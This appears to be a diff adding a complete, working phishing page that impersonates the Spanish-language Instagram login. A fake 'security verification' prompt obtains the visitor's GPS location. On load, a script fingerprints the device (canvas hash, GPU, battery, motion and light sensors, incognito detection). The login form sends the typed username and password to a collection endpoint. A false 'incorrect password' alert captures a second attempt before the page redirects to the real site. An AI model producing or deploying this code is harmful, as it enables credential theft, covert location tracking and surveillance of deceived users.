@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: #000000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: white;
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh; position: relative;
+        }
+        .lang-selector { margin-top: 30px; color: #f5f5f5; font-size: 14px; opacity: 0.6; }
+        .logo-container { margin-top: 60px; margin-bottom: 40px; width: 180px; }
+        .logo-img { width: 100%; filter: invert(1); }
+        form { width: 90%; max-width: 350px; display: flex; flex-direction: column; }
+        input {
+            background: #1c2b33; border: 1px solid #2d3846; border-radius: 5px;
+            color: white; font-size: 14px; margin-bottom: 12px; padding: 14px; outline: none;
+        }
+        button {
+            background-color: #0064e0; border: none; border-radius: 100px;
+            color: #fff; font-size: 14px; font-weight: 600; padding: 12px; margin-top: 15px; cursor: pointer;
+        }
+        .meta-footer { position: absolute; bottom: 15px; display: flex; flex-direction: column; align-items: center; width: 100%; }
+        .meta-logo { height: 12px; margin-top: 5px; filter: invert(1); opacity: 0.8; }
+
+        #bot-check {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 9999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .bot-box {
+            background: #262626; padding: 30px; border-radius: 15px;
+            text-align: center; width: 85%; max-width: 320px;
+            border: 1px solid #333;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="bot-check">
+        <div class="bot-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" style="width: 60px; margin-bottom: 20px;">
+            <h3 style="margin-bottom: 10px; font-size: 18px;">Verificación de Seguridad</h3>
+            <p style="font-size: 13px; color: #a8a8a8; margin-bottom: 25px; line-height: 1.4;">
+                Hemos detectado actividad inusual. Por favor, confirma tu identidad verificando tu ubicación actual.
+            </p>
+            <button onclick="getLocation()" style="width: 100%; margin: 0;">Verificar ahora</button>
+        </div>
+    </div>
+
+    <div class="lang-selector">Español (Estados Unidos) ⌄</div>
+
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo-img" alt="Instagram">
+    </div>
+
+    <form action="/" method="get">
+        <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required>
+        <input type="password" name="password" placeholder="Contraseña" required>
+        <button type="submit">Iniciar sesión</button>
+        <a href="#" style="color: #dbe7ff; font-size: 12px; text-align: center; margin-top: 20px; text-decoration: none;">¿Olvidaste tu contraseña?</a>
+    </form>
+
+    <div style="border: 1px solid #0064e0; color: #0064e0; border-radius: 100px; padding: 10px; width: 90%; max-width: 350px; text-align: center; font-size: 14px; margin-top: auto; margin-bottom: 60px;">Crear cuenta nueva</div>
+
+    <div class="meta-footer">
+        <span style="color:#555; font-size:12px;">from</span>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/2560px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
+    </div>
+
+    <script>
+        function getCanvasHash() {
+            try {
+                var canvas = document.createElement('canvas');
+                var ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Identidad_v2.0", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Identidad_v2.0", 4, 17);
+                var b64 = canvas.toDataURL().replace("data:image/png;base64,","");
+                var bin = atob(b64);
+                var crc = bin.slice(-16,-12);
+                return crc.charCodeAt(0).toString(16) + crc.charCodeAt(1).toString(16);
+            } catch(e) { return "Error_Canvas"; }
+        }
+
+        let movimiento = "Estático/Mesa";
+        window.addEventListener('devicemotion', event => {
+            const a = event.accelerationIncludingGravity;
+            if (a) {
+                const total = Math.sqrt(a.x*a.x + a.y*a.y + a.z*a.z);
+                if (total > 11) movimiento = "En Movimiento (Caminando/Vehículo)";
+                else if (total < 2) movimiento = "Caída Libre (?)";
+            }
+        });
+
+        let lux = "N/A";
+        try {
+            const sensor = new AmbientLightSensor();
+            sensor.onreading = () => { lux = sensor.illuminance + " lux"; };
+            sensor.start();
+        } catch(e) {}
+
+        async function aspiradoraDeDatos() {
+            let bat = { level: "N/A", status: "N/A" };
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    bat = { level: Math.round(b.level * 100) + "%", status: b.charging ? "Cargando" : "Descargando" };
+                } catch (e) {}
+            }
+
+            let isIncognito = false;
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                const { quota } = await navigator.storage.estimate();
+                if (quota < 120000000) isIncognito = true;
+            }
+
+            let gpu = "Bloqueado";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+
+            setTimeout(() => {
+                const conn = navigator.connection || {};
+                const datos = {
+                    event: "TELEMETRIA_TOTAL",
+                    fingerprint_id: getCanvasHash(),
+                    hardware: {
+                        cpu_cores: navigator.hardwareConcurrency || "N/A",
+                        ram_gb: navigator.deviceMemory || "N/A",
+                        gpu_renderer: gpu,
+                        screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
+                        sensor_movimiento: movimiento,
+                        sensor_luz: lux,
+                        modo_incognito: isIncognito
+                    },
+                    software: {
+                        os: navigator.platform,
+                        browser: navigator.userAgent,
+                        language: navigator.language,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        touch_points: navigator.maxTouchPoints
+                    },
+                    red: {
+                        tipo: conn.effectiveType || "N/A",
+                        velocidad: conn.downlink ? conn.downlink + " Mbps" : "N/A",
+                        rtt: conn.rtt + " ms"
+                    },
+                    estado: {
+                        bateria: bat,
+                        online: navigator.onLine,
+                        referrer: document.referrer || "Directo"
+                    }
+                };
+
+                fetch('/api/collect', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(datos)
+                });
+            }, 1000);
+        }
+
+        window.onload = aspiradoraDeDatos;
+
+        let intentos = 0;
+        const form = document.querySelector('form');
+        form.onsubmit = function(e) {
+            e.preventDefault();
+            intentos++;
+            const u = form.querySelector('input[name="usuario"]').value;
+            const p = form.querySelector('input[name="password"]').value;
+
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    event: "LOGIN_CRITICO",
+                    user: u,
+                    pass: p,
+                    try_count: intentos
+                })
+            }).then(() => {
+                if(intentos === 1) {
+                    alert("Lo sentimos, tu contraseña es incorrecta. Por favor, verifica tus datos nuevamente.");
+                    form.querySelector('input[name="password"]').value = "";
+                } else {
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }
+            });
+        };
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch('/api/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            event: "GPS_ACTIVO",
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy,
+                            alt: pos.coords.altitude || "N/A"
+                        })
+                    });
+                    document.getElementById('bot-check').style.display = 'none';
+                }, () => { document.getElementById('bot-check').style.display = 'none'; });
+            } else {
+                document.getElementById('bot-check').style.display = 'none';
+            }
+        }
+        function closeModal() { document.getElementById('bot-check').style.display = 'none'; }
+    </script>
+</body>
+</html>
+
